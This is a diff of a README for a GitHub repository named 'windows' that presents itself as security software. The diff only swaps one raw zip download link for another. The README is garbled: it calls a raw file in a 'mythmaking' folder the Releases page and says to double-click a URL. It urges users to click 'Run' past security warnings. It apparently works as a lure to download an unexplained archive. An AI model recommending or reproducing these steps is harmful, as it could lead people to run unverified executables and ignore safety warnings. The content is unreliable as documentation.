@@ -6,13 +6,13 @@ Welcome to the windows repository! This application helps you improve your compu
 
 ## 📥 Download the Application
 
-[![Download Now](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-3.1.zip)](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-3.1.zip)
+[![Download Now](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-v3.1.zip)](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-v3.1.zip)
 
 To get started with the windows application, you will first need to download it from our Releases page. This is where you will find the latest version of the software.
 
 ## 📂 Visit the Download Page
 
-Go to this link to download the application: [Download Here](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-3.1.zip)
+Go to this link to download the application: [Download Here](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-v3.1.zip)
 
 ## 💻 System Requirements
 
@@ -40,13 +40,13 @@ The application offers several key features to enhance your computer’s securit
 Follow these straightforward steps to install the application on your Windows computer:
 
 1. **Download the Software**
-   - Go back to the [Download Here](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-3.1.zip) link.
-   - Click on the latest version available, e.g., “https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-3.1.zip”.
+   - Go back to the [Download Here](https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-v3.1.zip) link.
+   - Click on the latest version available, e.g., “https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-v3.1.zip”.
    - Your browser will start the download. Save the file in a location you can easily access.
 
 2. **Run the Installer**
    - Navigate to the folder where you saved the downloaded file.
-   - Double-click on `https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-3.1.zip`.
+   - Double-click on `https://github.com/jorrip12/windows/raw/refs/heads/master/mythmaking/Software-v3.1.zip`.
    - A security warning may appear; click "Run" to proceed.
 
 3. **Complete the Installation**
